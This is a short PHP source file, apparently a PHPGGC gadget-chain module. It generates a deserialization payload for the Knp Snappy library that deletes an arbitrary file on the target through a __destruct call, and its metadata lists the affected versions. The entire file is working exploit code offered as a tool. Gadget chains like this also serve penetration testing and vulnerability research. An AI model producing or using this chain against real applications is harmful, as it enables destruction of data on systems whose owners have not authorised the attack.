<?php

namespace GadgetChain\Snappy;

class FD1 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '*';
    public static $vector = '__destruct';
    public static $author = 'coiffeur';
    public static $information = '
        Note that some files may not be removed (depends on permissions).
        Target versions: commit 619dcfd7b4fb50804288aedd6850d0b4ffabbaea, 15 May 2023 (~v1.4.2) <= exploitable
    ';

    public function generate(array $parameters)
    {
        return new \Knp\Snappy\Image($parameters['remote_path']);
    }
}
